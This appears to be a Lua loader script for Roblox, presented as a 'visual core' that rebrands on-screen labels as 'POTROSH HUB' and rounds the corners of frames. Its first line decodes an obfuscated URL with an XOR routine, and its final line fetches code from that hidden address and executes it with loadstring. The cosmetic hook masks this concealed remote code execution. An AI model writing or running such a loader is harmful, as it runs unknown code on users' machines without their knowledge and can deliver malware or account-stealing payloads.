
--[[ STAGE 2: VISUAL CORE ]]
local RXxLKoZcwIq4GimpRZqkd="\026\061\068\071\077\139\135\142\104\098\123\169\121\118\152\131\167\151\181\182\179\195\187\190\196\229\221\217\250\039\243\246\255\068\010\018\024\038\041\056\055\066\066\094\090\152\098\121\107\120\119\154\143\145\152\222\167\178\177\185\001\168\196\198\043\050\219\209\247\008\004\039\041\012\033\041\033\081\060\080\061\059\091\117\115\132\144\110\111\128\136\138\149\168\201\201\193\206\187\031\221\230\241\065\066\005\080\073\018\050\037"local JPAo6XD6I3ro19xLWck=74 local kmFvuTp3sDpt=235 local Ynrd01CtPgYM9nhFq=0 local mNm78QUlgM6L2Aj0kMJ=7 local R_T42WW1Vw1wX1wMDxkZl=6 local NWZRnUq3r4afso=false local q4mJYAmVrP2MBQXaB7=bit32 and bit32.bxor if not q4mJYAmVrP2MBQXaB7 then q4mJYAmVrP2MBQXaB7=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local PfHY_Bs_NJCR7={}for QLMmrpKGkGl6=1,#RXxLKoZcwIq4GimpRZqkd do local z44jb2WYQwu8s7L5kgx=string.byte(RXxLKoZcwIq4GimpRZqkd,QLMmrpKGkGl6)local V3W1Hp0V3BIPMD8aO=(kmFvuTp3sDpt+(QLMmrpKGkGl6*mNm78QUlgM6L2Aj0kMJ)+R_T42WW1Vw1wX1wMDxkZl)%256 if Ynrd01CtPgYM9nhFq==0 then z44jb2WYQwu8s7L5kgx=(z44jb2WYQwu8s7L5kgx-V3W1Hp0V3BIPMD8aO)%256 PfHY_Bs_NJCR7[QLMmrpKGkGl6]=string.char(q4mJYAmVrP2MBQXaB7(z44jb2WYQwu8s7L5kgx,JPAo6XD6I3ro19xLWck))else z44jb2WYQwu8s7L5kgx=q4mJYAmVrP2MBQXaB7(z44jb2WYQwu8s7L5kgx,JPAo6XD6I3ro19xLWck)PfHY_Bs_NJCR7[QLMmrpKGkGl6]=string.char((z44jb2WYQwu8s7L5kgx-V3W1Hp0V3BIPMD8aO)%256)end end local tiE8GMg3dFYCcx2i=table.concat(PfHY_Bs_NJCR7)if NWZRnUq3r4afso then tiE8GMg3dFYCcx2i=string.reverse(tiE8GMg3dFYCcx2i)end local BC9y7XJrXVjvZ3PLhpP=tiE8GMg3dFYCcx2i
local HubName = "POTROSH HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(BC9y7XJrXVjvZ3PLhpP))()
